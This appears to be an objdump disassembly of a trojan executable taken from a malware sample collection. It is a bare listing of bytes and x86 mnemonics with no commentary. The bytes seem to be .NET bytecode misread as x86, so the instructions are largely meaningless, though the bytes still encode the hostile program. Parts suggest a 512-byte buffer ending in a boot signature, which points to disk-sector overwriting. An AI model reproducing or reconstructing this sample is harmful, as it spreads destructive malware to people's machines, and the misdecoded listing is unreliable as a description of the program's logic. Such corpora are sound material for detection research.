
malware_samples/trojan/a16eecee6aa3bf02029cef722595b11c7d2088a02c4678cc23afb50badddfc5f.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	06                   	push   %es
  402001:	3f                   	aas
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 38 27 00    	add    %al,0x273800
  402013:	00 fc                	add    %bh,%ah
  402015:	16                   	push   %ss
  402016:	00 00                	add    %al,(%eax)
  402018:	03 00                	add    (%eax),%eax
  40201a:	02 00                	add    (%eax),%al
  40201c:	0d 00 00 06 00       	or     $0x60000,%eax
	...
  40204d:	00 00                	add    %al,(%eax)
  40204f:	00 1b                	add    %bl,(%ebx)
  402051:	30 07                	xor    %al,(%edi)
  402053:	00 4f 00             	add    %cl,0x0(%edi)
  402056:	00 00                	add    %al,(%eax)
  402058:	01 00                	add    %eax,(%eax)
  40205a:	00 11                	add    %dl,(%ecx)
  40205c:	72 01                	jb     0x40205f
  40205e:	00 00                	add    %al,(%eax)
  402060:	70 20                	jo     0x402082
  402062:	00 00                	add    %al,(%eax)
  402064:	00 40 19             	add    %al,0x19(%eax)
  402067:	7e 14                	jle    0x40207d
  402069:	00 00                	add    %al,(%eax)
  40206b:	0a 19                	or     (%ecx),%bl
  40206d:	16                   	push   %ss
  40206e:	7e 14                	jle    0x402084
  402070:	00 00                	add    %al,(%eax)
  402072:	0a 28                	or     (%eax),%ch
  402074:	01 00                	add    %eax,(%eax)
  402076:	00 06                	add    %al,(%esi)
  402078:	0a 06                	or     (%esi),%al
  40207a:	6f                   	outsl  %ds:(%esi),(%dx)
  40207b:	15 00 00 0a 2c       	adc    $0x2c0a0000,%eax
  402080:	02 de                	add    %dh,%bl
  402082:	27                   	daa
  402083:	06                   	push   %es
  402084:	03 03                	add    (%ebx),%eax
  402086:	8e 69 12             	mov    0x12(%ecx),%gs
  402089:	01 7e 14             	add    %edi,0x14(%esi)
  40208c:	00 00                	add    %al,(%eax)
  40208e:	0a 28                	or     (%eax),%ch
  402090:	02 00                	add    (%eax),%al
  402092:	00 06                	add    %al,(%esi)
  402094:	2c 08                	sub    $0x8,%al
  402096:	07                   	pop    %es
  402097:	6e                   	outsb  %ds:(%esi),(%dx)
  402098:	03 8e 69 6a 26 26    	add    0x26266a69(%esi),%ecx
  40209e:	de 0a                	fimuls (%edx)
  4020a0:	06                   	push   %es
  4020a1:	2c 06                	sub    $0x6,%al
  4020a3:	06                   	push   %es
  4020a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4020a5:	16                   	push   %ss
  4020a6:	00 00                	add    %al,(%eax)
  4020a8:	0a dc                	or     %ah,%bl
  4020aa:	2a 00                	sub    (%eax),%al
  4020ac:	01 10                	add    %edx,(%eax)
  4020ae:	00 00                	add    %al,(%eax)
  4020b0:	02 00                	add    (%eax),%al
  4020b2:	1d 00 27 44 00       	sbb    $0x442700,%eax
  4020b7:	0a 00                	or     (%eax),%al
  4020b9:	00 00                	add    %al,(%eax)
  4020bb:	00 13                	add    %dl,(%ebx)
  4020bd:	30 03                	xor    %al,(%ebx)
  4020bf:	00 4e 00             	add    %cl,0x0(%esi)
  4020c2:	00 00                	add    %al,(%eax)
  4020c4:	02 00                	add    (%eax),%al
  4020c6:	00 11                	add    %dl,(%ecx)
  4020c8:	20 fe                	and    %bh,%dh
  4020ca:	01 00                	add    %eax,(%eax)
  4020cc:	00 8d 26 00 00 01    	add    %cl,0x1000026(%ebp)
  4020d2:	25 d0 07 00 00       	and    $0x7d0,%eax
  4020d7:	04 28                	add    $0x28,%al
  4020d9:	17                   	pop    %ss
  4020da:	00 00                	add    %al,(%eax)
  4020dc:	0a 0a                	or     (%edx),%cl
  4020de:	12 00                	adc    (%eax),%al
  4020e0:	20 00                	and    %al,(%eax)
  4020e2:	02 00                	add    (%eax),%al
  4020e4:	00 28                	add    %ch,(%eax)
  4020e6:	01 00                	add    %eax,(%eax)
  4020e8:	00 2b                	add    %ch,(%ebx)
  4020ea:	1f                   	pop    %ds
  4020eb:	39 0b                	cmp    %ecx,(%ebx)
  4020ed:	2b 08                	sub    (%eax),%ecx
  4020ef:	06                   	push   %es
  4020f0:	07                   	pop    %es
  4020f1:	16                   	push   %ss
  4020f2:	9c                   	pushf
  4020f3:	07                   	pop    %es
  4020f4:	17                   	pop    %ss
  4020f5:	58                   	pop    %eax
  4020f6:	0b 07                	or     (%edi),%eax
  4020f8:	20 fe                	and    %bh,%dh
  4020fa:	01 00                	add    %eax,(%eax)
  4020fc:	00 32                	add    %dh,(%edx)
  4020fe:	f0 06                	lock push %es
  402100:	20 fe                	and    %bh,%dh
  402102:	01 00                	add    %eax,(%eax)
  402104:	00 1f                	add    %bl,(%edi)
  402106:	55                   	push   %ebp
  402107:	9c                   	pushf
  402108:	06                   	push   %es
  402109:	20 ff                	and    %bh,%bh
  40210b:	01 00                	add    %eax,(%eax)
  40210d:	00 20                	add    %ah,(%eax)
  40210f:	aa                   	stos   %al,%es:(%edi)
  402110:	00 00                	add    %al,(%eax)
  402112:	00 9c 06 2a 1e 02 28 	add    %bl,0x28021e2a(%esi,%eax,1)
  402119:	19 00                	sbb    %eax,(%eax)
  40211b:	00 0a                	add    %cl,(%edx)
  40211d:	2a 00                	sub    (%eax),%al
  40211f:	00 13                	add    %dl,(%ebx)
  402121:	30 02                	xor    %al,(%edx)
  402123:	00 2f                	add    %ch,(%edi)
  402125:	00 00                	add    %al,(%eax)
  402127:	00 03                	add    %al,(%ebx)
  402129:	00 00                	add    %al,(%eax)
  40212b:	11 12                	adc    %edx,(%edx)
  40212d:	00 28                	add    %ch,(%eax)
  40212f:	1a 00                	sbb    (%eax),%al
  402131:	00 0a                	add    %cl,(%edx)
  402133:	7d 09                	jge    0x40213e
  402135:	00 00                	add    %al,(%eax)
  402137:	04 12                	add    $0x12,%al
  402139:	00 15 7d 08 00 00    	add    %dl,0x87d
  40213f:	04 12                	add    $0x12,%al
  402141:	00 7c 09 00          	add    %bh,0x0(%ecx,%ecx,1)
  402145:	00 04 12             	add    %al,(%edx,%edx,1)
  402148:	00 28                	add    %ch,(%eax)
  40214a:	02 00                	add    (%eax),%al
  40214c:	00 2b                	add    %ch,(%ebx)
  40214e:	12 00                	adc    (%eax),%al
  402150:	7c 09                	jl     0x40215b
  402152:	00 00                	add    %al,(%eax)
  402154:	04 28                	add    $0x28,%al
  402156:	1c 00                	sbb    $0x0,%al
  402158:	00 0a                	add    %cl,(%edx)
  40215a:	2a 00                	sub    (%eax),%al
  40215c:	1b 30                	sbb    (%eax),%esi
  40215e:	06                   	push   %es
  40215f:	00 27                	add    %ah,(%edi)
  402161:	00 00                	add    %al,(%eax)
  402163:	00 04 00             	add    %al,(%eax,%eax,1)
  402166:	00 11                	add    %dl,(%ecx)
  402168:	1f                   	pop    %ds
  402169:	13 17                	adc    (%edi),%edx
  40216b:	16                   	push   %ss
  40216c:	12 00                	adc    (%eax),%al
  40216e:	28 08                	sub    %cl,(%eax)
  402170:	00 00                	add    %al,(%eax)
  402172:	06                   	push   %es
  402173:	26 20 22             	and    %ah,%es:(%edx)
  402176:	00 00                	add    %al,(%eax)
  402178:	c0 16 16             	rclb   $0x16,(%esi)
  40217b:	7e 14                	jle    0x402191
  40217d:	00 00                	add    %al,(%eax)
  40217f:	0a 1c 12             	or     (%edx,%edx,1),%bl
  402182:	01 28                	add    %ebp,(%eax)
  402184:	07                   	pop    %es
  402185:	00 00                	add    %al,(%eax)
  402187:	06                   	push   %es
  402188:	26 de 03             	fiadds %es:(%ebx)
  40218b:	26 de 00             	fiadds %es:(%eax)
  40218e:	2a 00                	sub    (%eax),%al
  402190:	01 10                	add    %edx,(%eax)
  402192:	00 00                	add    %al,(%eax)
  402194:	00 00                	add    %al,(%eax)
  402196:	00 00                	add    %al,(%eax)
  402198:	23 23                	and    (%ebx),%esp
  40219a:	00 03                	add    %al,(%ebx)
  40219c:	1a 00                	sbb    (%eax),%al
  40219e:	00 01                	add    %al,(%ecx)
  4021a0:	13 30                	adc    (%eax),%esi
  4021a2:	02 00                	add    (%eax),%al
  4021a4:	2f                   	das
  4021a5:	00 00                	add    %al,(%eax)
  4021a7:	00 05 00 00 11 12    	add    %al,0x12110000
  4021ad:	00 28                	add    %ch,(%eax)
  4021af:	1a 00                	sbb    (%eax),%al
  4021b1:	00 0a                	add    %cl,(%edx)
  4021b3:	7d 0d                	jge    0x4021c2
  4021b5:	00 00                	add    %al,(%eax)
  4021b7:	04 12                	add    $0x12,%al
  4021b9:	00 15 7d 0c 00 00    	add    %dl,0xc7d
  4021bf:	04 12                	add    $0x12,%al
  4021c1:	00 7c 0d 00          	add    %bh,0x0(%ebp,%ecx,1)
  4021c5:	00 04 12             	add    %al,(%edx,%edx,1)
  4021c8:	00 28                	add    %ch,(%eax)
  4021ca:	03 00                	add    (%eax),%eax
  4021cc:	00 2b                	add    %ch,(%ebx)
  4021ce:	12 00                	adc    (%eax),%al
  4021d0:	7c 0d                	jl     0x4021df
  4021d2:	00 00                	add    %al,(%eax)
  4021d4:	04 28                	add    $0x28,%al
  4021d6:	1c 00                	sbb    $0x0,%al
  4021d8:	00 0a                	add    %cl,(%edx)
  4021da:	2a 1e                	sub    (%esi),%bl
  4021dc:	02 28                	add    (%eax),%ch
  4021de:	19 00                	sbb    %eax,(%eax)
  4021e0:	00 0a                	add    %cl,(%edx)
  4021e2:	2a 2e                	sub    (%esi),%ch
  4021e4:	72 27                	jb     0x40220d
  4021e6:	00 00                	add    %al,(%eax)
  4021e8:	70 80                	jo     0x40216a
  4021ea:	05 00 00 04 2a       	add    $0x2a040000,%eax
  4021ef:	00 13                	add    %dl,(%ebx)
  4021f1:	30 01                	xor    %al,(%ecx)
  4021f3:	00 14 00             	add    %dl,(%eax,%eax,1)
  4021f6:	00 00                	add    %al,(%eax)
  4021f8:	06                   	push   %es
  4021f9:	00 00                	add    %al,(%eax)
  4021fb:	11 02                	adc    %eax,(%edx)
  4021fd:	28 0a                	sub    %cl,(%edx)
  4021ff:	00 00                	add    %al,(%eax)
  402201:	06                   	push   %es
  402202:	6f                   	outsl  %ds:(%esi),(%dx)
  402203:	1d 00 00 0a 0a       	sbb    $0xa0a0000,%eax
  402208:	12 00                	adc    (%eax),%al
  40220a:	28 1e                	sub    %bl,(%esi)
  40220c:	00 00                	add    %al,(%eax)
  40220e:	0a 2a                	or     (%edx),%ch
  402210:	13 30                	adc    (%eax),%esi
  402212:	02 00                	add    (%eax),%al
  402214:	37                   	aaa
  402215:	00 00                	add    %al,(%eax)
  402217:	00 07                	add    %al,(%edi)
  402219:	00 00                	add    %al,(%eax)
  40221b:	11 12                	adc    %edx,(%edx)
  40221d:	00 28                	add    %ch,(%eax)
  40221f:	1a 00                	sbb    (%eax),%al
  402221:	00 0a                	add    %cl,(%edx)
  402223:	7d 10                	jge    0x402235
  402225:	00 00                	add    %al,(%eax)
  402227:	04 12                	add    $0x12,%al
  402229:	00 02                	add    %al,(%edx)
  40222b:	7d 11                	jge    0x40223e
  40222d:	00 00                	add    %al,(%eax)
  40222f:	04 12                	add    $0x12,%al
  402231:	00 15 7d 0f 00 00    	add    %dl,0xf7d
  402237:	04 12                	add    $0x12,%al
  402239:	00 7c 10 00          	add    %bh,0x0(%eax,%edx,1)
  40223d:	00 04 12             	add    %al,(%edx,%edx,1)
  402240:	00 28                	add    %ch,(%eax)
  402242:	04 00                	add    $0x0,%al
  402244:	00 2b                	add    %ch,(%ebx)
  402246:	12 00                	adc    (%eax),%al
  402248:	7c 10                	jl     0x40225a
  40224a:	00 00                	add    %al,(%eax)
  40224c:	04 28                	add    $0x28,%al
  40224e:	1c 00                	sbb    $0x0,%al
  402250:	00 0a                	add    %cl,(%edx)
  402252:	2a 2e                	sub    (%esi),%ch
  402254:	73 1f                	jae    0x402275
  402256:	00 00                	add    %al,(%eax)
  402258:	0a 80 06 00 00 04    	or     0x4000006(%eax),%al
  40225e:	2a 00                	sub    (%eax),%al
  402260:	1b 30                	sbb    (%eax),%esi
  402262:	05 00 49 01 00       	add    $0x14900,%eax
  402267:	00 08                	add    %cl,(%eax)
  402269:	00 00                	add    %al,(%eax)
  40226b:	11 02                	adc    %eax,(%edx)
  40226d:	7b 08                	jnp    0x402277
  40226f:	00 00                	add    %al,(%eax)
  402271:	04 0a                	add    $0xa,%al
  402273:	06                   	push   %es
  402274:	26 00 06             	add    %al,%es:(%esi)
  402277:	39 cb                	cmp    %ecx,%ebx
  402279:	00 00                	add    %al,(%eax)
  40227b:	00 28                	add    %ch,(%eax)
  40227d:	20 00                	and    %al,(%eax)
  40227f:	00 0a                	add    %cl,(%edx)
  402281:	6f                   	outsl  %ds:(%esi),(%dx)
  402282:	21 00                	and    %eax,(%eax)
  402284:	00 0a                	add    %cl,(%edx)
  402286:	6f                   	outsl  %ds:(%esi),(%dx)
  402287:	22 00                	and    (%eax),%al
  402289:	00 0a                	add    %cl,(%edx)
  40228b:	0b 02                	or     (%edx),%eax
  40228d:	72 79                	jb     0x402308
  40228f:	00 00                	add    %al,(%eax)
  402291:	70 7d                	jo     0x402310
  402293:	0a 00                	or     (%eax),%al
  402295:	00 04 7e             	add    %al,(%esi,%edi,2)
  402298:	23 00                	and    (%eax),%eax
  40229a:	00 0a                	add    %cl,(%edx)
  40229c:	02 7b 0a             	add    0xa(%ebx),%bh
  40229f:	00 00                	add    %al,(%eax)
  4022a1:	04 6f                	add    $0x6f,%al
  4022a3:	24 00                	and    $0x0,%al
  4022a5:	00 0a                	add    %cl,(%edx)
  4022a7:	0c 08                	or     $0x8,%al
  4022a9:	72 d9                	jb     0x402284
  4022ab:	00 00                	add    %al,(%eax)
  4022ad:	70 72                	jo     0x402321
  4022af:	db 00                	fildl  (%eax)
  4022b1:	00 70 07             	add    %dh,0x7(%eax)
  4022b4:	72 db                	jb     0x402291
  4022b6:	00 00                	add    %al,(%eax)
  4022b8:	70 28                	jo     0x4022e2
  4022ba:	25 00 00 0a 6f       	and    $0x6f0a0000,%eax
  4022bf:	26 00 00             	add    %al,%es:(%eax)
  4022c2:	0a 08                	or     (%eax),%cl
  4022c4:	72 df                	jb     0x4022a5
  4022c6:	00 00                	add    %al,(%eax)
  4022c8:	70 72                	jo     0x40233c
  4022ca:	d9 00                	flds   (%eax)
  4022cc:	00 70 6f             	add    %dh,0x6f(%eax)
  4022cf:	26 00 00             	add    %al,%es:(%eax)
  4022d2:	0a de                	or     %dh,%bl
  4022d4:	0e                   	push   %cs
  4022d5:	06                   	push   %es
  4022d6:	16                   	push   %ss
  4022d7:	2f                   	das
  4022d8:	09 08                	or     %ecx,(%eax)
  4022da:	2c 06                	sub    $0x6,%al
  4022dc:	08 6f 16             	or     %ch,0x16(%edi)
  4022df:	00 00                	add    %al,(%eax)
  4022e1:	0a dc                	or     %ah,%bl
  4022e3:	73 27                	jae    0x40230c
  4022e5:	00 00                	add    %al,(%eax)
  4022e7:	0a 25 72 ff 00 00    	or     0xff72,%ah
  4022ed:	70 6f                	jo     0x40235e
  4022ef:	28 00                	sub    %al,(%eax)
  4022f1:	00 0a                	add    %cl,(%edx)
  4022f3:	25 17 6f 29 00       	and    $0x296f17,%eax
  4022f8:	00 0a                	add    %cl,(%edx)
  4022fa:	25 17 6f 2a 00       	and    $0x2a6f17,%eax
  4022ff:	00 0a                	add    %cl,(%edx)
  402301:	25 17 6f 2b 00       	and    $0x2b6f17,%eax
  402306:	00 0a                	add    %cl,(%edx)
  402308:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  40230b:	00 0a                	add    %cl,(%edx)
  40230d:	26 20 e8             	es and %ch,%al
  402310:	03 00                	add    (%eax),%eax
  402312:	00 28                	add    %ch,(%eax)
  402314:	2d 00 00 0a 6f       	sub    $0x6f0a0000,%eax
  402319:	1d 00 00 0a 0d       	sbb    $0xd0a0000,%eax
  40231e:	12 03                	adc    (%ebx),%al
  402320:	28 2e                	sub    %ch,(%esi)
  402322:	00 00                	add    %al,(%eax)
  402324:	0a 2d 3c 02 16 25    	or     0x2516023c,%ch
  40232a:	0a 7d 08             	or     0x8(%ebp),%bh
  40232d:	00 00                	add    %al,(%eax)
  40232f:	04 02                	add    $0x2,%al
  402331:	09 7d 0b             	or     %edi,0xb(%ebp)
  402334:	00 00                	add    %al,(%eax)
  402336:	04 02                	add    $0x2,%al
  402338:	7c 09                	jl     0x402343
  40233a:	00 00                	add    %al,(%eax)
  40233c:	04 12                	add    $0x12,%al
  40233e:	03 02                	add    (%edx),%eax
  402340:	28 05 00 00 2b de    	sub    %al,0xde2b0000
  402346:	6d                   	insl   (%dx),%es:(%edi)
  402347:	02 7b 0b             	add    0xb(%ebx),%bh
  40234a:	00 00                	add    %al,(%eax)
  40234c:	04 0d                	add    $0xd,%al
  40234e:	02 7c 0b 00          	add    0x0(%ebx,%ecx,1),%bh
  402352:	00 04 fe             	add    %al,(%esi,%edi,8)
  402355:	15 19 00 00 01       	adc    $0x1000019,%eax
  40235a:	02 15 25 0a 7d 08    	add    0x87d0a25,%dl
  402360:	00 00                	add    %al,(%eax)
  402362:	04 12                	add    $0x12,%al
  402364:	03 28                	add    (%eax),%ebp
  402366:	1e                   	push   %ds
  402367:	00 00                	add    %al,(%eax)
  402369:	0a 7e 23             	or     0x23(%esi),%bh
  40236c:	00 00                	add    %al,(%eax)
  40236e:	0a 02                	or     (%edx),%al
  402370:	7b 0a                	jnp    0x40237c
  402372:	00 00                	add    %al,(%eax)
  402374:	04 6f                	add    $0x6f,%al
  402376:	30 00                	xor    %al,(%eax)
  402378:	00 0a                	add    %cl,(%edx)
  40237a:	02 14 7d 0a 00 00 04 	add    0x400000a(,%edi,2),%dl
  402381:	de 03                	fiadds (%ebx)
  402383:	26 de 00             	fiadds %es:(%eax)
  402386:	de 19                	ficomps (%ecx)
  402388:	13 04 02             	adc    (%edx,%eax,1),%eax
  40238b:	1f                   	pop    %ds
  40238c:	fe                   	(bad)
  40238d:	7d 08                	jge    0x402397
  40238f:	00 00                	add    %al,(%eax)
  402391:	04 02                	add    $0x2,%al
  402393:	7c 09                	jl     0x40239e
  402395:	00 00                	add    %al,(%eax)
  402397:	04 11                	add    $0x11,%al
  402399:	04 28                	add    $0x28,%al
  40239b:	31 00                	xor    %eax,(%eax)
  40239d:	00 0a                	add    %cl,(%edx)
  40239f:	de 13                	ficoms (%ebx)
  4023a1:	02 1f                	add    (%edi),%bl
  4023a3:	fe                   	(bad)
  4023a4:	7d 08                	jge    0x4023ae
  4023a6:	00 00                	add    %al,(%eax)
  4023a8:	04 02                	add    $0x2,%al
  4023aa:	7c 09                	jl     0x4023b5
  4023ac:	00 00                	add    %al,(%eax)
  4023ae:	04 28                	add    $0x28,%al
  4023b0:	32 00                	xor    (%eax),%al
  4023b2:	00 0a                	add    %cl,(%edx)
  4023b4:	2a 00                	sub    (%eax),%al
  4023b6:	00 00                	add    %al,(%eax)
  4023b8:	41                   	inc    %ecx
  4023b9:	4c                   	dec    %esp
  4023ba:	00 00                	add    %al,(%eax)
  4023bc:	02 00                	add    (%eax),%al
  4023be:	00 00                	add    %al,(%eax)
  4023c0:	3c 00                	cmp    $0x0,%al
  4023c2:	00 00                	add    %al,(%eax)
  4023c4:	2d 00 00 00 69       	sub    $0x69000000,%eax
  4023c9:	00 00                	add    %al,(%eax)
  4023cb:	00 0e                	add    %cl,(%esi)
	...
  4023d5:	00 00                	add    %al,(%eax)
  4023d7:	00 0a                	add    %cl,(%edx)
  4023d9:	00 00                	add    %al,(%eax)
  4023db:	00 0d 01 00 00 17    	add    %cl,0x17000001
  4023e1:	01 00                	add    %eax,(%eax)
  4023e3:	00 03                	add    %al,(%ebx)
  4023e5:	00 00                	add    %al,(%eax)
  4023e7:	00 10                	add    %dl,(%eax)
  4023e9:	00 00                	add    %al,(%eax)
  4023eb:	01 00                	add    %eax,(%eax)
  4023ed:	00 00                	add    %al,(%eax)
  4023ef:	00 07                	add    %al,(%edi)
  4023f1:	00 00                	add    %al,(%eax)
  4023f3:	00 15 01 00 00 1c    	add    %dl,0x1c000001
  4023f9:	01 00                	add    %eax,(%eax)
  4023fb:	00 19                	add    %bl,(%ecx)
  4023fd:	00 00                	add    %al,(%eax)
  4023ff:	00 1a                	add    %bl,(%edx)
  402401:	00 00                	add    %al,(%eax)
  402403:	01 36                	add    %esi,(%esi)
  402405:	02 7c 09 00          	add    0x0(%ecx,%ecx,1),%bh
  402409:	00 04 03             	add    %al,(%ebx,%eax,1)
  40240c:	28 33                	sub    %dh,(%ebx)
  40240e:	00 00                	add    %al,(%eax)
  402410:	0a 2a                	or     (%edx),%ch
  402412:	00 00                	add    %al,(%eax)
  402414:	1b 30                	sbb    (%eax),%esi
  402416:	03 00                	add    (%eax),%eax
  402418:	16                   	push   %ss
  402419:	01 00                	add    %eax,(%eax)
  40241b:	00 09                	add    %cl,(%ecx)
  40241d:	00 00                	add    %al,(%eax)
  40241f:	11 02                	adc    %eax,(%edx)
  402421:	7b 0c                	jnp    0x40242f
  402423:	00 00                	add    %al,(%eax)
  402425:	04 0a                	add    $0xa,%al
  402427:	06                   	push   %es
  402428:	2c 3e                	sub    $0x3e,%al
  40242a:	06                   	push   %es
  40242b:	17                   	pop    %ss
  40242c:	3b b0 00 00 00 28    	cmp    0x28000000(%eax),%esi
  402432:	06                   	push   %es
  402433:	00 00                	add    %al,(%eax)
  402435:	06                   	push   %es
  402436:	6f                   	outsl  %ds:(%esi),(%dx)
  402437:	1d 00 00 0a 0c       	sbb    $0xc0a0000,%eax
  40243c:	12 02                	adc    (%edx),%al
  40243e:	28 2e                	sub    %ch,(%esi)
  402440:	00 00                	add    %al,(%eax)
  402442:	0a 2d 3f 02 16 25    	or     0x2516023f,%ch
  402448:	0a 7d 0c             	or     0xc(%ebp),%bh
  40244b:	00 00                	add    %al,(%eax)
  40244d:	04 02                	add    $0x2,%al
  40244f:	08 7d 0e             	or     %bh,0xe(%ebp)
  402452:	00 00                	add    %al,(%eax)
  402454:	04 02                	add    $0x2,%al
  402456:	7c 0d                	jl     0x402465
  402458:	00 00                	add    %al,(%eax)
  40245a:	04 12                	add    $0x12,%al
  40245c:	02 02                	add    (%edx),%al
  40245e:	28 06                	sub    %al,(%esi)
  402460:	00 00                	add    %al,(%eax)
  402462:	2b dd                	sub    %ebp,%ebx
  402464:	cd 00                	int    $0x0
  402466:	00 00                	add    %al,(%eax)
  402468:	02 7b 0e             	add    0xe(%ebx),%bh
  40246b:	00 00                	add    %al,(%eax)
  40246d:	04 0c                	add    $0xc,%al
  40246f:	02 7c 0e 00          	add    0x0(%esi,%ecx,1),%bh
  402473:	00 04 fe             	add    %al,(%esi,%edi,8)
  402476:	15 19 00 00 01       	adc    $0x1000019,%eax
  40247b:	02 15 25 0a 7d 0c    	add    0xc7d0a25,%dl
  402481:	00 00                	add    %al,(%eax)
  402483:	04 12                	add    $0x12,%al
  402485:	02 28                	add    (%eax),%ch
  402487:	1e                   	push   %ds
  402488:	00 00                	add    %al,(%eax)
  40248a:	0a 7e 05             	or     0x5(%esi),%bh
  40248d:	00 00                	add    %al,(%eax)
  40248f:	04 28                	add    $0x28,%al
  402491:	0e                   	push   %cs
  402492:	00 00                	add    %al,(%eax)
  402494:	06                   	push   %es
  402495:	26 73 05             	es jae 0x40249d
  402498:	00 00                	add    %al,(%eax)
  40249a:	06                   	push   %es
  40249b:	25 6f 04 00 00       	and    $0x46f,%eax
  4024a0:	06                   	push   %es
  4024a1:	0b 07                	or     (%edi),%eax
  4024a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4024a4:	03 00                	add    (%eax),%eax
  4024a6:	00 06                	add    %al,(%esi)
  4024a8:	20 88 13 00 00 28    	and    %cl,0x28000013(%eax)
  4024ae:	2d 00 00 0a 6f       	sub    $0x6f0a0000,%eax
  4024b3:	1d 00 00 0a 0c       	sbb    $0xc0a0000,%eax
  4024b8:	12 02                	adc    (%edx),%al
  4024ba:	28 2e                	sub    %ch,(%esi)
  4024bc:	00 00                	add    %al,(%eax)
  4024be:	0a 2d 3c 02 17 25    	or     0x2517023c,%ch
  4024c4:	0a 7d 0c             	or     0xc(%ebp),%bh
  4024c7:	00 00                	add    %al,(%eax)
  4024c9:	04 02                	add    $0x2,%al
  4024cb:	08 7d 0e             	or     %bh,0xe(%ebp)
  4024ce:	00 00                	add    %al,(%eax)
  4024d0:	04 02                	add    $0x2,%al
  4024d2:	7c 0d                	jl     0x4024e1
  4024d4:	00 00                	add    %al,(%eax)
  4024d6:	04 12                	add    $0x12,%al
  4024d8:	02 02                	add    (%edx),%al
  4024da:	28 06                	sub    %al,(%esi)
  4024dc:	00 00                	add    %al,(%eax)
  4024de:	2b de                	sub    %esi,%ebx
  4024e0:	54                   	push   %esp
  4024e1:	02 7b 0e             	add    0xe(%ebx),%bh
  4024e4:	00 00                	add    %al,(%eax)
  4024e6:	04 0c                	add    $0xc,%al
  4024e8:	02 7c 0e 00          	add    0x0(%esi,%ecx,1),%bh
  4024ec:	00 04 fe             	add    %al,(%esi,%edi,8)
  4024ef:	15 19 00 00 01       	adc    $0x1000019,%eax
  4024f4:	02 15 25 0a 7d 0c    	add    0xc7d0a25,%dl
  4024fa:	00 00                	add    %al,(%eax)
  4024fc:	04 12                	add    $0x12,%al
  4024fe:	02 28                	add    (%eax),%ch
  402500:	1e                   	push   %ds
  402501:	00 00                	add    %al,(%eax)
  402503:	0a 28                	or     (%eax),%ch
  402505:	09 00                	or     %eax,(%eax)
  402507:	00 06                	add    %al,(%esi)
  402509:	de 17                	ficoms (%edi)
  40250b:	0d 02 1f fe 7d       	or     $0x7dfe1f02,%eax
  402510:	0c 00                	or     $0x0,%al
  402512:	00 04 02             	add    %al,(%edx,%eax,1)
  402515:	7c 0d                	jl     0x402524
  402517:	00 00                	add    %al,(%eax)
  402519:	04 09                	add    $0x9,%al
  40251b:	28 31                	sub    %dh,(%ecx)
  40251d:	00 00                	add    %al,(%eax)
  40251f:	0a de                	or     %dh,%bl
  402521:	13 02                	adc    (%edx),%eax
  402523:	1f                   	pop    %ds
  402524:	fe                   	(bad)
  402525:	7d 0c                	jge    0x402533
  402527:	00 00                	add    %al,(%eax)
  402529:	04 02                	add    $0x2,%al
  40252b:	7c 0d                	jl     0x40253a
  40252d:	00 00                	add    %al,(%eax)
  40252f:	04 28                	add    $0x28,%al
  402531:	32 00                	xor    (%eax),%al
  402533:	00 0a                	add    %cl,(%edx)
  402535:	2a 00                	sub    (%eax),%al
  402537:	00 01                	add    %al,(%ecx)
  402539:	10 00                	adc    %al,(%eax)
  40253b:	00 00                	add    %al,(%eax)
  40253d:	00 07                	add    %al,(%edi)
  40253f:	00 e4                	add    %ah,%ah
  402541:	eb 00                	jmp    0x402543
  402543:	17                   	pop    %ss
  402544:	1a 00                	sbb    (%eax),%al
  402546:	00 01                	add    %al,(%ecx)
  402548:	36 02 7c 0d 00       	add    %ss:0x0(%ebp,%ecx,1),%bh
  40254d:	00 04 03             	add    %al,(%ebx,%eax,1)
  402550:	28 33                	sub    %dh,(%ebx)
  402552:	00 00                	add    %al,(%eax)
  402554:	0a 2a                	or     (%edx),%ch
  402556:	00 00                	add    %al,(%eax)
  402558:	1b 30                	sbb    (%eax),%esi
  40255a:	04 00                	add    $0x0,%al
  40255c:	75 01                	jne    0x40255f
  40255e:	00 00                	add    %al,(%eax)
  402560:	0a 00                	or     (%eax),%al
  402562:	00 11                	add    %dl,(%ecx)
  402564:	02 7b 0f             	add    0xf(%ebx),%bh
  402567:	00 00                	add    %al,(%eax)
  402569:	04 0a                	add    $0xa,%al
  40256b:	06                   	push   %es
  40256c:	26 00 06             	add    %al,%es:(%esi)
  40256f:	39 e8                	cmp    %ebp,%eax
  402571:	00 00                	add    %al,(%eax)
  402573:	00 7e 06             	add    %bh,0x6(%esi)
  402576:	00 00                	add    %al,(%eax)
  402578:	04 13                	add    $0x13,%al
  40257a:	05 16 13 06 11       	add    $0x11061316,%eax
  40257f:	05 12 06 28 34       	add    $0x34280612,%eax
  402584:	00 00                	add    %al,(%eax)
  402586:	0a 7e 06             	or     0x6(%esi),%bh
  402589:	00 00                	add    %al,(%eax)
  40258b:	04 1f                	add    $0x1f,%al
  40258d:	64 20 e7             	fs and %ah,%bh
  402590:	03 00                	add    (%eax),%eax
  402592:	00 6f 35             	add    %ch,0x35(%edi)
  402595:	00 00                	add    %al,(%eax)
  402597:	0a 0b                	or     (%ebx),%cl
  402599:	de 10                	ficoms (%eax)
  40259b:	06                   	push   %es
  40259c:	16                   	push   %ss
  40259d:	2f                   	das
  40259e:	0b 11                	or     (%ecx),%edx
  4025a0:	06                   	push   %es
  4025a1:	2c 07                	sub    $0x7,%al
  4025a3:	11 05 28 36 00 00    	adc    %eax,0x3628
  4025a9:	0a dc                	or     %ah,%bl
  4025ab:	28 37                	sub    %dh,(%edi)
  4025ad:	00 00                	add    %al,(%eax)
  4025af:	0a 13                	or     (%ebx),%dl
  4025b1:	07                   	pop    %es
  4025b2:	12 07                	adc    (%edi),%al
  4025b4:	72 1b                	jb     0x4025d1
  4025b6:	01 00                	add    %eax,(%eax)
  4025b8:	70 28                	jo     0x4025e2
  4025ba:	38 00                	cmp    %al,(%eax)
  4025bc:	00 0a                	add    %cl,(%edx)
  4025be:	0c 72                	or     $0x72,%al
  4025c0:	2d 01 00 70 08       	sub    $0x8700001,%eax
  4025c5:	07                   	pop    %es
  4025c6:	8c 31                	mov    %?,(%ecx)
  4025c8:	00 00                	add    %al,(%eax)
  4025ca:	01 28                	add    %ebp,(%eax)
  4025cc:	39 00                	cmp    %eax,(%eax)
